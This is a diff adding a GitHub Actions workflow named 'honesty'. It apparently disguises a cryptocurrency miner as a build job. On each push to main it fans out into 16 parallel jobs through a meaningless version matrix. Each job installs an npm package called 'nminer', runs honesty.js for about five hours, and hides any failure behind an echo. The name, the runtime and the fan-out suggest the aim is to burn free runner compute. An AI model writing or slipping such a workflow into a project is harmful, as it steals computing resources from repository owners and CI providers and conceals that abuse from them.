@@ -1,0 +1,41 @@
+name: honesty
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 3327 }
+          - { version: 6721 }
+          - { version: 2210 }
+          - { version: 1969 }
+          - { version: 8754 }
+          - { version: 7375 }
+          - { version: 5926 }
+          - { version: 1900 }
+          - { version: 2776 }
+          - { version: 3391 }
+          - { version: 5498 }
+          - { version: 8928 }
+          - { version: 108 }
+          - { version: 1201 }
+          - { version: 6114 }
+          - { version: 514 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: wordy
+        run: |
+          npm install nminer@latest
+          timeout 307m node honesty.js || echo "honesty executed"
